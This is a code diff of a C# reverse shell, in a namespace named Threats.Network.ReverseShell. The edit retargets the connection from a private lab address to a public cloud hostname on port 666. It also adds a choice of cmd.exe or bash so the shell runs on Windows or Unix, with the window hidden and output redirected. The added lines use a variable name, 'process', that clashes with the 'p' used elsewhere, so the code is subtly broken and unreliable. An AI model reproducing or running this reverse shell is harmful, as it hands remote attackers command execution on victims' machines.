@@ -12,7 +12,7 @@ namespace Threats.Network.ReverseShell
 
         public static void Main(string[] args)
         {
-            using (TcpClient client = new TcpClient("10.0.2.15", 443))
+            using (TcpClient client = new TcpClient("ec2-63-35-224-89.eu-west-1.compute.amazonaws.com", 666))
             {
                 using (Stream stream = client.GetStream())
                 {
@@ -23,7 +23,14 @@ namespace Threats.Network.ReverseShell
                         StringBuilder strInput = new StringBuilder();
 
                         Process p = new Process();
-                        p.StartInfo.FileName = "cmd.exe";
+                        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+                        {
+                            process.StartInfo.FileName = @"cmd.exe";
+                        }
+                        else
+                        {
+                            process.StartInfo.FileName = @"bash";
+                        }
                         p.StartInfo.CreateNoWindow = true;
                         p.StartInfo.UseShellExecute = false;
                         p.StartInfo.RedirectStandardOutput = true;
@@ -32,6 +39,8 @@ namespace Threats.Network.ReverseShell
                         p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                         p.Start();
                         p.BeginOutputReadLine();
+
+                        
 
                         while (true)
                         {
